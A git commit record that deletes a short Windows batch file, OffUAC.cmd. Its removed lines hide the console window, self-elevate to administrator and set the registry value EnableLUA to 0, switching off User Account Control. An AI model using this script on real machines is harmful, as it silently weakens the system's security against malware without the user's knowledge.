12964e0d15fd0200a70bbbc648ae4cbd8e97d66c
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-12 16:58:10 +0300

    Delete OffUAC.cmd

--- OffUAC.cmd
+++
@@ -1,7 +0,0 @@
-@echo off
-powershell.exe -windowstyle Hidden -command
-Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)
-title z%random% && cd %temp%
-
-cmd.exe %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-exit
